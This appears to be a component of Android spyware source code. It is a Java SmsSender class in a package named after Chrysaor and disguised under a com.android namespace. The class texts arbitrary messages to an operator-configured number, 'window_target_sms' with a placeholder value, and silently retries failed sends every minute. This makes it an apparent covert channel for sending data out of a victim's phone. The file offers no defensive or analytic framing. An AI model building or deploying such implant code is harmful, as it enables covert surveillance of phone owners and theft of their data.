package com.android.chrysaoralike;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.telephony.SmsManager;
import android.util.Log;
import android.os.Handler;

import androidx.annotation.RequiresApi;

public class SmsSender {
    private static final String TAG = "SmsSender";
    private Context context;
    private Handler handler;
    private String targetNumber;

    public SmsSender(Context context) {
        this.context = context.getApplicationContext();
        this.handler = new Handler(context.getMainLooper());
        this.targetNumber = context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE)
                .getString("window_target_sms", "+1234567890");
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void send(String message, int ackId) {
        if (targetNumber == null || targetNumber.isEmpty()) { Log.e(TAG, "No target number."); return; }
        SmsManager smsManager = SmsManager.getDefault();
        Intent sentIntent = new Intent("SMS_SENT_" + ackId);
        PendingIntent sentPI = PendingIntent.getBroadcast(context, ackId, sentIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        context.registerReceiver(new BroadcastReceiver() {
            @Override public void onReceive(Context ctx, Intent intent) {
                int resultCode = getResultCode();
                if (resultCode != android.app.Activity.RESULT_OK) {
                    Log.w(TAG, "SMS send failed. Retry in 60s.");
                    handler.postDelayed(() -> send(message, ackId), 60000);
                }
                ctx.unregisterReceiver(this);
            }
        }, new IntentFilter("SMS_SENT_" + ackId), Context.RECEIVER_NOT_EXPORTED);
        smsManager.sendTextMessage(targetNumber, null, message, sentPI, null);
        Log.i(TAG, "Outbound SMS sent to " + targetNumber + ": " + message);
    }
    public void setTargetNumber(String number) { this.targetNumber = number; }
}